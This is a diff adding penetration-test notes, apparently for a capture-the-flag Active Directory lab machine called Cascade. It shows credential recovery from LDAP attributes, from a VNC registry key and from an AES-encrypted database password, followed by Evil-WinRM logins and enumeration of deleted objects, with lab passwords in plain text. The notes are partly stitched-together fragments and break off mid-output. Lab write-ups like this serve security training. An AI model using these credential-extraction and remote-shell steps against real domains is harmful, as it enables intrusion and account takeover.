@@ -1,0 +1,913 @@
+
+
+from ldap
+dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+...
+sAMAccountName: r.thompson
+sAMAccountType: 805306368
+userPrincipalName: r.thompson@cascade.local
+...
+cascadeLegacyPwd: clk0bjVldmE=
+
+
+┌──(kali㉿kali)-[~]
+└─$ echo clk0bjVldmE= | base64 -d
+rY4n5eva                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+smbmap -H 10.10.10.182 -u r.thompson -p 'rY4n5eva'
+
+[\] Enumerating shares...                                                                                           [|] Enumerating shares...                                                                                                                                                                                               
+[+] IP: 10.10.10.182:445        Name: cascade.local             Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        Audit$                                                  NO ACCESS
+        C$                                                      NO ACCESS       Default share
+        Data                                                    READ ONLY
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        print$                                                  READ ONLY       Printer Drivers
+        SYSVOL                                                  READ ONLY       Logon server share 
+[/] Closing connections..                                                                                           [-] Closing connections..      
+
+┌──(kali㉿kali)-[~]
+└─$ impacket-smbclient cascade.local/r.thompson:rY4n5eva@10.10.10.182                 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# use Data
+# ls
+drw-rw-rw-          0  Tue Jan 28 17:05:51 2020 .
+drw-rw-rw-          0  Tue Jan 28 17:05:51 2020 ..
+drw-rw-rw-          0  Sun Jan 12 20:45:14 2020 Contractors
+drw-rw-rw-          0  Sun Jan 12 20:45:10 2020 Finance
+drw-rw-rw-          0  Tue Jan 28 13:04:51 2020 IT
+drw-rw-rw-          0  Sun Jan 12 20:45:20 2020 Production
+drw-rw-rw-          0  Sun Jan 12 20:45:16 2020 Temps
+
+# cd IT
+# ls
+drw-rw-rw-          0  Tue Jan 28 13:04:51 2020 .
+drw-rw-rw-          0  Tue Jan 28 13:04:51 2020 ..
+drw-rw-rw-          0  Tue Jan 28 13:00:30 2020 Email Archives
+drw-rw-rw-          0  Tue Jan 28 13:04:51 2020 LogonAudit
+drw-rw-rw-          0  Tue Jan 28 19:53:04 2020 Logs
+drw-rw-rw-          0  Tue Jan 28 17:06:59 2020 Temp
+# cd Logs
+# ls
+drw-rw-rw-          0  Tue Jan 28 19:53:04 2020 .
+drw-rw-rw-          0  Tue Jan 28 19:53:04 2020 ..
+drw-rw-rw-          0  Tue Jan 28 19:53:04 2020 Ark AD Recycle Bin
+drw-rw-rw-          0  Tue Jan 28 19:56:00 2020 DCs
+
+
+# cat ArkAdRecycleBin.log
+1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
+1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
+1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
+2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
+2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
+2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
+2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
+2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
+8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
+8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
+8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
+8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
+8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
+
+# 
+# cd DCs
+# ls
+drw-rw-rw-          0  Tue Jan 28 19:56:00 2020 .
+drw-rw-rw-          0  Tue Jan 28 19:56:00 2020 ..
+-rw-rw-rw-       5967  Sun Jan 26 17:22:05 2020 dcdiag.log
+# cat dcdiag.log
+
+Directory Server Diagnosis
+
+Performing initial setup:
+   Trying to find home server...
+   Home Server = CASC-DC1
+   * Identified AD Forest. 
+   Done gathering initial info.
+
+Doing initial required tests
+   
+   Testing server: Default-First-Site-Name\CASC-DC1
+      Starting test: Connectivity
+         ......................... CASC-DC1 passed test Connectivity
+
+Doing primary tests
+   
+   Testing server: Default-First-Site-Name\CASC-DC1
+      Starting test: Advertising
+         ......................... CASC-DC1 passed test Advertising
+      Starting test: FrsEvent
+         ......................... CASC-DC1 passed test FrsEvent
+      Starting test: DFSREvent
+         ......................... CASC-DC1 passed test DFSREvent
+      Starting test: SysVolCheck
+         ......................... CASC-DC1 passed test SysVolCheck
+      Starting test: KccEvent
+         ......................... CASC-DC1 passed test KccEvent
+      Starting test: KnowsOfRoleHolders
+         ......................... CASC-DC1 passed test KnowsOfRoleHolders
+      Starting test: MachineAccount
+         ......................... CASC-DC1 passed test MachineAccount
+      Starting test: NCSecDesc
+         ......................... CASC-DC1 passed test NCSecDesc
+      Starting test: NetLogons
+         ......................... CASC-DC1 passed test NetLogons
+      Starting test: ObjectsReplicated
+         ......................... CASC-DC1 passed test ObjectsReplicated
+      Starting test: Replications
+         ......................... CASC-DC1 passed test Replications
+      Starting test: RidManager
+         ......................... CASC-DC1 passed test RidManager
+      Starting test: Services
+         ......................... CASC-DC1 passed test Services
+      Starting test: SystemLog
+         A warning event occurred.  EventID: 0x8000001D
+            Time Generated: 01/10/2020   15:48:14
+            Event String:
+            The Key Distribution Center (KDC) cannot find a suitable certificate to use for smart card logons, or the KDC certificate could not be verified. Smart card logon may not function correctly if this problem is not resolved. To correct this problem, either verify the existing KDC certificate using certutil.exe or enroll for a new KDC certificate.
+         An error event occurred.  EventID: 0xC00038D6
+            Time Generated: 01/10/2020   15:48:43
+            Event String:
+            The DFS Namespace service could not initialize cross forest trust information on this domain controller, but it will periodically retry the operation. The return code is in the record data.
+         A warning event occurred.  EventID: 0x000003F6
+            Time Generated: 01/10/2020   15:48:43
+            Event String:
+            Name resolution for the name _ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.cascade.local timed out after none of the configured DNS servers responded.
+         A warning event occurred.  EventID: 0x0000000C
+            Time Generated: 01/10/2020   15:48:43
+            Event String:
+            Time Provider NtpClient: This machine is configured to use the domain hierarchy to determine its time source, but it is the AD PDC emulator for the domain at the root of the forest, so there is no machine above it in the domain hierarchy to use as a time source. It is recommended that you either configure a reliable time service in the root domain, or manually configure the AD PDC to synchronize with an external time source. Otherwise, this machine will function as the authoritative time source in the domain hierarchy. If an external time source is not configured or used for this computer, you may choose to disable the NtpClient.
+         A warning event occurred.  EventID: 0x000727AA
+            Time Generated: 01/10/2020   15:50:52
+            Event String:
+            The WinRM service failed to create the following SPNs: WSMAN/CASC-DC1.cascade.local; WSMAN/CASC-DC1. 
+         ......................... CASC-DC1 failed test SystemLog
+      Starting test: VerifyReferences
+         ......................... CASC-DC1 passed test VerifyReferences
+   
+   
+   Running partition tests on : ForestDnsZones
+      Starting test: CheckSDRefDom
+         ......................... ForestDnsZones passed test CheckSDRefDom
+      Starting test: CrossRefValidation
+         ......................... ForestDnsZones passed test
+         CrossRefValidation
+   
+   Running partition tests on : DomainDnsZones
+      Starting test: CheckSDRefDom
+         ......................... DomainDnsZones passed test CheckSDRefDom
+      Starting test: CrossRefValidation
+         ......................... DomainDnsZones passed test
+         CrossRefValidation
+   
+   Running partition tests on : Schema
+      Starting test: CheckSDRefDom
+         ......................... Schema passed test CheckSDRefDom
+      Starting test: CrossRefValidation
+         ......................... Schema passed test CrossRefValidation
+   
+   Running partition tests on : Configuration
+      Starting test: CheckSDRefDom
+         ......................... Configuration passed test CheckSDRefDom
+      Starting test: CrossRefValidation
+         ......................... Configuration passed test CrossRefValidation
+   
+   Running partition tests on : cascade
+      Starting test: CheckSDRefDom
+         ......................... cascade passed test CheckSDRefDom
+      Starting test: CrossRefValidation
+         ......................... cascade passed test CrossRefValidation
+   
+   Running enterprise tests on : cascade.local
+      Starting test: LocatorCheck
+         ......................... cascade.local passed test LocatorCheck
+      Starting test: Intersite
+         ......................... cascade.local passed test Intersite
+
+# 
+# cd Email Archives
+# ls
+drw-rw-rw-          0  Tue Jan 28 13:00:30 2020 .
+drw-rw-rw-          0  Tue Jan 28 13:00:30 2020 ..
+-rw-rw-rw-       2522  Tue Jan 28 13:00:30 2020 Meeting_Notes_June_2018.html
+# cat Meeting_Notes_June_2018.html
+<html>
+<body lang=EN-GB link=blue vlink=purple style='tab-interval:36.0pt'>
+
+<div class=WordSection1>
+
+<p class=MsoNormal style='margin-left:120.0pt;text-indent:-120.0pt;tab-stops:
+120.0pt;mso-layout-grid-align:none;text-autospace:none'><b><span
+style='mso-bidi-font-family:Calibri;color:black'>From:<span style='mso-tab-count:
+1'>                                         </span></span></b><span
+style='mso-bidi-font-family:Calibri;color:black'>Steve Smith
+<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:120.0pt;text-indent:-120.0pt;tab-stops:
+120.0pt;mso-layout-grid-align:none;text-autospace:none'><b><span
+style='mso-bidi-font-family:Calibri;color:black'>To:<span style='mso-tab-count:
+1'>                                               </span></span></b><span
+style='mso-bidi-font-family:Calibri;color:black'>IT (Internal)<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:120.0pt;text-indent:-120.0pt;tab-stops:
+120.0pt;mso-layout-grid-align:none;text-autospace:none'><b><span
+style='mso-bidi-font-family:Calibri;color:black'>Sent:<span style='mso-tab-count:
+1'>                                           </span></span></b><span
+style='mso-bidi-font-family:Calibri;color:black'>14 June 2018 14:07<o:p></o:p></span></p>
+
+
+<p class=MsoNormal style='margin-left:120.0pt;text-indent:-120.0pt;tab-stops:
+120.0pt;mso-layout-grid-align:none;text-autospace:none'><b><span
+style='mso-bidi-font-family:Calibri;color:black'>Subject:<span
+style='mso-tab-count:1'>                                     </span></span></b><span
+style='mso-bidi-font-family:Calibri;color:black'>Meeting Notes<o:p></o:p></span></p>
+
+<p><o:p>&nbsp;</o:p></p>
+
+<p>For anyone that missed yesterday’s meeting (I’m looking at
+you Ben). Main points are below:</p>
+
+<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+
+<p>-- New production network will be going live on
+Wednesday so keep an eye out for any issues. </p>
+
+<p>-- We will be using a temporary account to
+perform all tasks related to the network migration and this account will be deleted at the end of
+2018 once the migration is complete. This will allow us to identify actions
+related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>
+
+<p>-- The winner of the “Best GPO” competition will be
+announced on Friday so get your submissions in soon.</p>
+
+<p class=MsoNormal><o:p>&nbsp;</o:p></p>
+
+<p class=MsoNormal>Steve</p>
+
+
+</div>
+
+</body>
+
+</html>
+
+# cd s.smith
+# ls
+drw-rw-rw-          0  Tue Jan 28 15:00:05 2020 .
+drw-rw-rw-          0  Tue Jan 28 15:00:05 2020 ..
+-rw-rw-rw-       2680  Tue Jan 28 15:00:01 2020 VNC Install.reg
+# cat VNC Install.reg
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
+"ExtraPorts"=""
+"QueryTimeout"=dword:0000001e
+"QueryAcceptOnTimeout"=dword:00000000
+"LocalInputPriorityTimeout"=dword:00000003
+"LocalInputPriority"=dword:00000000
+"BlockRemoteInput"=dword:00000000
+"BlockLocalInput"=dword:00000000
+"IpAccessControl"=""
+"RfbPort"=dword:0000170c
+"HttpPort"=dword:000016a8
+"DisconnectAction"=dword:00000000
+"AcceptRfbConnections"=dword:00000001
+"UseVncAuthentication"=dword:00000001
+"UseControlAuthentication"=dword:00000000
+"RepeatControlAuthentication"=dword:00000000
+"LoopbackOnly"=dword:00000000
+"AcceptHttpConnections"=dword:00000001
+"LogLevel"=dword:00000000
+"EnableFileTransfers"=dword:00000001
+"RemoveWallpaper"=dword:00000001
+"UseD3D"=dword:00000001
+"UseMirrorDriver"=dword:00000001
+"EnableUrlParams"=dword:00000001
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+"AlwaysShared"=dword:00000000
+"NeverShared"=dword:00000000
+"DisconnectClients"=dword:00000001
+"PollingInterval"=dword:000003e8
+"AllowLoopback"=dword:00000000
+"VideoRecognitionInterval"=dword:00000bb8
+"GrabTransparentWindows"=dword:00000001
+"SaveLogToAllUsersPath"=dword:00000000
+"RunControlInterface"=dword:00000001
+"IdleTimeout"=dword:00000000
+"VideoClasses"=""
+"VideoRects"=""
+
+msf6 > irb
+[*] Starting IRB shell...
+[*] You are in the "framework" object
+
+irb: warn: can't alias jobs from irb_jobs.
+>> key="\x17\x52\x6b\x06\x23\x4e\x58\x07"
+=> "\x17Rk\x06#NX\a"
+>> require 'rev/proto/rfb'
+...
+>> Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), key
+=> "sT333ve2"
+>> 
+
+
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\s.smith\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\s.smith\Desktop> ls
+
+
+    Directory: C:\Users\s.smith\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        8/18/2025   9:28 PM             34 user.txt
+-a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk
+
+
+
+
+*Evil-WinRM* PS C:\Users\s.smith\Desktop> Get-ADUser -identity s.smith -properties *
+
+
+AccountExpirationDate              :
+accountExpires                     : 9223372036854775807
+AccountLockoutTime                 :
+AccountNotDelegated                : False
+AllowReversiblePasswordEncryption  : False
+BadLogonCount                      : 0
+badPasswordTime                    : 132247275952778272
+badPwdCount                        : 0
+CannotChangePassword               : True
+CanonicalName                      : cascade.local/UK/Users/Steve Smith
+Certificates                       : {}
+City                               :
+CN                                 : Steve Smith
+codePage                           : 0
+Company                            :
+Country                            :
+countryCode                        : 0
+Created                            : 1/9/2020 6:08:13 PM
+createTimeStamp                    : 1/9/2020 6:08:13 PM
+Deleted                            :
+Department                         :
+Description                        :
+DisplayName                        : Steve Smith
+DistinguishedName                  : CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
+Division                           :
+DoesNotRequirePreAuth              : False
+dSCorePropagationData              : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/13/2020 4:36:28 PM, 1/9/2020 6:08:13 PM...}
+EmailAddress                       :
+EmployeeID                         :
+EmployeeNumber                     :
+Enabled                            : True
+Fax                                :
+GivenName                          : Steve
+HomeDirectory                      :
+HomedirRequired                    : False
+HomeDrive                          :
+HomePage                           :
+HomePhone                          :
+Initials                           :
+instanceType                       : 4
+isDeleted                          :
+LastBadPasswordAttempt             : 1/28/2020 11:26:35 PM
+LastKnownParent                    :
+lastLogoff                         : 0
+lastLogon                          : 132247275990842339
+LastLogonDate                      : 8/18/2025 10:34:23 PM
+lastLogonTimestamp                 : 134000264635982267
+LockedOut                          : False
+logonCount                         : 16
+LogonWorkstations                  :
+Manager                            :
+MemberOf                           : {CN=Audit Share,OU=Groups,OU=UK,DC=cascade,DC=local, CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local, CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local}
+MNSLogonAccount                    : False
+MobilePhone                        :
+Modified                           : 8/18/2025 10:34:23 PM
+modifyTimeStamp                    : 8/18/2025 10:34:23 PM
+msDS-User-Account-Control-Computed : 0
+Name                               : Steve Smith
+nTSecurityDescriptor               : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                     : CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+ObjectClass                        : user
+ObjectGUID                         : 38ebd9df-c4f7-4d00-9a9f-f503432ffa7d
+objectSid                          : S-1-5-21-3332504370-1206983947-1165150453-1107
+Office                             :
+OfficePhone                        :
+Organization                       :
+OtherName                          :
+PasswordExpired                    : False
+PasswordLastSet                    : 1/28/2020 7:58:05 PM
+PasswordNeverExpires               : True
+PasswordNotRequired                : False
+POBox                              :
+PostalCode                         :
+PrimaryGroup                       : CN=Domain Users,CN=Users,DC=cascade,DC=local
+primaryGroupID                     : 513
+ProfilePath                        :
+ProtectedFromAccidentalDeletion    : False
+pwdLastSet                         : 132247150854857364
+SamAccountName                     : s.smith
+sAMAccountType                     : 805306368
+ScriptPath                         : MapAuditDrive.vbs
+sDRightsEffective                  : 0
+ServicePrincipalNames              : {}
+SID                                : S-1-5-21-3332504370-1206983947-1165150453-1107
+SIDHistory                         : {}
+SmartcardLogonRequired             : False
+sn                                 : Smith
+State                              :
+StreetAddress                      :
+Surname                            : Smith
+Title                              :
+TrustedForDelegation               : False
+TrustedToAuthForDelegation         : False
+UseDESKeyOnly                      : False
+userAccountControl                 : 66048
+userCertificate                    : {}
+UserPrincipalName                  : s.smith@cascade.local
+uSNChanged                         : 340158
+uSNCreated                         : 16404
+whenChanged                        : 8/18/2025 10:34:23 PM
+whenCreated                        : 1/9/2020 6:08:13 PM
+
+
+
+*Evil-WinRM* PS C:\Users\s.smith\Desktop> 
+
+
+
+SQLite
+Let's download RunAudit.bat for further examination.
+The batch file executes CascAudit.exe with a database file located in the DB folder passed as
+input. Download the database and use the file command to check the file type.
+get MapAuditDrive.vbs
+get MapDataDrive.vbs
+'MapAuditDrive.vbs
+Option Explicit
+Dim oNetwork, strDriveLetter, strRemotePath
+strDriveLetter = "F:"
+strRemotePath = "\\CASC-DC1\Audit$"
+Set oNetwork = CreateObject("WScript.Network")
+oNetwork.MapNetworkDrive strDriveLetter, strRemotePath
+WScript.Quit
+smbclient \\\\10.10.10.182\\Audit$ -U s.smith
+CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
+It is identified as a SQLite database. The sqlitebrowser utility can be used to inspect the DB
+contents.
+The table LDAP contains a password for the ArkSvc user. It seems to be base64 encoded, but
+decoding it does not return any useful output, which indicates that the data is encrypted.
+CascAudit
+Since this database is used by the CascAudit.exe executable let's download and attempt to
+decompile it. This may help us to understand how the password was encrypted. The file
+command can be used to identify the type of executable.
+It's identified as a .NET executable, so we can use a .NET decompiler such as dnSpy to open it. It
+can be run on Linux using wine. Download the latest 64-bit release from the official GitHub repo.
+sqlitebrowser Audit.db
+sudo apt install wine64 -y
+cd ~/Downloads
+unzip dnSpy-netcore-win64.zip
+cd dnSpy-netcore-win64
+wine dnSpy.exe
+Click on File , then Open and locate CascAudit.exe to decompile it. Locate the main function
+by clicking on CascAudit (1.0.0.0) , then CascAudit and selecting MainModule .
+The relevant code that decrypts the password is shown below.
+string text = string.Empty;
+string password = string.Empty;
+string text2 = string.Empty;
+try
+{
+   sqliteConnection.Open();
+   using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP",
+   sqliteConnection))
+   {
+      using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
+      {
+         sqliteDataReader.Read();
+         text = Conversions.ToString(sqliteDataReader["Uname"]);
+         text2 = Conversions.ToString(sqliteDataReader["Domain"]);
+         string text3 = Conversions.ToString(sqliteDataReader["Pwd"]);
+         try
+         {
+            password = Crypto.DecryptString(text3, "c4scadek3y654321");
+         }
+         catch (Exception ex)
+         {
+            Console.WriteLine("Error decrypting password: " + ex.Message);
+            return;
+         }
+      }
+   }
+   sqliteConnection.Close();
+}
+public static string DecryptString(string EncryptedString, string Key)
+{
+   byte[] array = Convert.FromBase64String(EncryptedString);
+   Aes aes = Aes.Create();
+   aes.KeySize = 128;
+   aes.BlockSize = 128;
+   aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
+   aes.Mode = 1;
+   aes.Key = Encoding.UTF8.GetBytes(Key);
+   string @string;
+   using (MemoryStream memoryStream = new MemoryStream(array))
+   {
+      using (CryptoStream cryptoStream = new
+n+        CryptoStream(memoryStream, aes.CreateDecryptor(), 0))
+      {
+         byte[] array2 = new byte[checked(array.Length - 1 + 1)];
+         cryptoStream.Read(array2, 0, array2.Length);
+         @string = Encoding.UTF8.GetString(array2);
+      }
+   }
+   return @string;
+}
+The decryption is successful, revealing the password for the ArcSvc account to be
+w3lc0meFr31nd . We confirm that ArkSvc is in the Remote Management Users group.
+Use Evil-WinRM as before to connect to the system.
+A PowerShell Remoting session as ArkSvc is established, but the root flag is not available.
+import pyaes
+from base64 import b64decode
+key = b"c4scadek3y654321"
+iv = b"1tdyjCbY1Ix49842"
+aes = pyaes.AESModeOfOperationCBC(key, iv = iv)
+decrypted = aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw=='))
+print(decrypted.decode())
+evil-winrm -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd
+Privilege Escalation
+Let's enumerate the group membership of our current user.
+The user is identified to belong to the AD Recycle Bin group. The Active Directory Recycle Bin is
+used to recover deleted Active Directory objects such as Users, Groups, OUs etc. The objects keep
+all their properties intact while in the AD Recycle Bin, which allows them to be restored at any
+point. Let's enumerate the AD Recycle Bin for interesting objects using the Get-ADObject
+command, and filtering only deleted objects with the isDeleted propert
+
+
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects
+
+
+Deleted           : True
+DistinguishedName : CN=Deleted Objects,DC=cascade,DC=local
+Name              : Deleted Objects
+ObjectClass       : container
+ObjectGUID        : 51de9801-3625-4ac2-a605-d6bd71617681
+
+Deleted           : True
+DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
+Name              : CASC-WS1
+                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+ObjectClass       : computer
+ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
+
+Deleted           : True
+DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
+Name              : Scheduled Tasks
+                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+ObjectClass       : group
+ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2
+
+Deleted           : True
+DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
+Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
+                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+ObjectClass       : groupPolicyContainer
+ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
+
+Deleted           : True
+DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
+Name              : Machine
+                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
+ObjectClass       : container
+ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34
+
+Deleted           : True
+DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
+Name              : User
+                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
+ObjectClass       : container
+ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88
+
+Deleted           : True
+DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
+Name              : TempAdmin
+                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
+ObjectClass       : user
+ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
+
+
+
+*Evil-WinRM* PS C:\Users\arksvc\Documents> 
+
+
+
+*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
+
+
+CanonicalName                   : cascade.local/Deleted Objects
+CN                              : Deleted Objects
+Created                         : 1/9/2020 3:31:39 PM
+createTimeStamp                 : 1/9/2020 3:31:39 PM
+Deleted                         : True
+Description                     : Default container for deleted objects
+DisplayName                     :
+DistinguishedName               : CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/1/1601 12:00:00 AM}
+instanceType                    : 4
+isCriticalSystemObject          : True
+isDeleted                       : True
+LastKnownParent                 :
+Modified                        : 1/13/2020 1:21:17 AM
+modifyTimeStamp                 : 1/13/2020 1:21:17 AM
+Name                            : Deleted Objects
+ObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=cascade,DC=local
+ObjectClass                     : container
+ObjectGUID                      : 51de9801-3625-4ac2-a605-d6bd71617681
+ProtectedFromAccidentalDeletion :
+sDRightsEffective               : 0
+showInAdvancedViewOnly          : True
+systemFlags                     : -1946157056
+uSNChanged                      : 65585
+uSNCreated                      : 5695
+whenChanged                     : 1/13/2020 1:21:17 AM
+whenCreated                     : 1/9/2020 3:31:39 PM
+
+accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : cascade.local/Deleted Objects/CASC-WS1
+                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+CN                              : CASC-WS1
+                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+codePage                        : 0
+countryCode                     : 0
+Created                         : 1/9/2020 7:30:19 PM
+createTimeStamp                 : 1/9/2020 7:30:19 PM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM}
+instanceType                    : 4
+isCriticalSystemObject          : False
+isDeleted                       : True
+LastKnownParent                 : OU=Computers,OU=UK,DC=cascade,DC=local
+lastLogoff                      : 0
+lastLogon                       : 0
+localPolicyFlags                : 0
+logonCount                      : 0
+Modified                        : 1/28/2020 6:08:35 PM
+modifyTimeStamp                 : 1/28/2020 6:08:35 PM
+msDS-LastKnownRDN               : CASC-WS1
+Name                            : CASC-WS1
+                                  DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : computer
+ObjectGUID                      : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
+objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1108
+primaryGroupID                  : 515
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 132230718192147073
+sAMAccountName                  : CASC-WS1$
+sDRightsEffective               : 0
+userAccountControl              : 4128
+uSNChanged                      : 245849
+uSNCreated                      : 24603
+whenChanged                     : 1/28/2020 6:08:35 PM
+whenCreated                     : 1/9/2020 7:30:19 PM
+
+CanonicalName                   : cascade.local/Deleted Objects/Scheduled Tasks
+                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+CN                              : Scheduled Tasks
+                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+Created                         : 1/13/2020 5:21:53 PM
+createTimeStamp                 : 1/13/2020 5:21:53 PM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
+dSCorePropagationData           : {1/17/2020 9:35:46 PM, 1/17/2020 9:32:57 PM, 1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM...}
+groupType                       : -2147483644
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=Groups,OU=UK,DC=cascade,DC=local
+Modified                        : 1/28/2020 6:07:55 PM
+modifyTimeStamp                 : 1/28/2020 6:07:55 PM
+msDS-LastKnownRDN               : Scheduled Tasks
+Name                            : Scheduled Tasks
+                                  DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : group
+ObjectGUID                      : 13375728-5ddb-4137-b8b8-b9041d1d3fd2
